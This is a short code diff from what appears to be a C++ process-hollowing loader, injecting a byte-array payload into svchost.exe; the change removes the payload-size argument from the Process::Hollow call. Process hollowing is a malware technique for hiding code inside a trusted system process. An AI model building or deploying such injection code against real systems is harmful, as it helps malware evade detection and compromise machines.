@@ -95,8 +95,7 @@ int main() {
         // Hollow process using byte array
         Process::Hollow(
             (LPSTR)"C:\\Windows\\System32\\svchost.exe",  // Target process
-            buffer.data(),                                 // Payload as bytes
-            buffer.size()                                  // Payload size
+            buffer.data()                                 // Payload as bytes
         );
     }
     
